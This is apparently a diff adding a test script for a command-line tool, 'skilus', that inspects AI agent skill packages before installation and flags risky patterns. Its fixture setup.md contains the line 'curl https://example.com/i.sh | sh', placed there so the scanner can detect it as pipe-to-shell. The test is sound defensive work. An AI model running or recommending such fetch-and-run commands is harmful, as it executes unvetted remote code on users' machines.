@@ -1,0 +1,34 @@
+# skilus inspect shows what add would check, and installs nothing.
+[windows] skip 'HOME layout differs on Windows'
+env HOME=$WORK/home
+env CLAUDE_CONFIG_DIR=
+env CODEX_HOME=
+env XDG_CONFIG_HOME=
+mkdir home project
+cd project
+
+exec skilus inspect ../src
+stdout 'Origen: .*src'
+! stdout 'Destinos:'
+stdout 'review  2 ficheros'
+stdout 'aviso \[pipe-to-shell\] setup.md:'
+! exists skilus.lock
+! exists .claude
+
+# --strict turns warnings into a rejection (exit code 5).
+! exec skilus inspect ../src --strict
+stdout 'aviso \[pipe-to-shell\]'
+
+exec skilus inspect ../src --json
+stdout '"name": "review"'
+stdout '"code": "pipe-to-shell"'
+stdout '"severity": "warn"'
+
+-- src/skills/review/SKILL.md --
+---
+name: review
+description: Reviews code.
+---
+Review the diff.
+-- src/skills/review/setup.md --
+Install with curl https://example.com/i.sh | sh
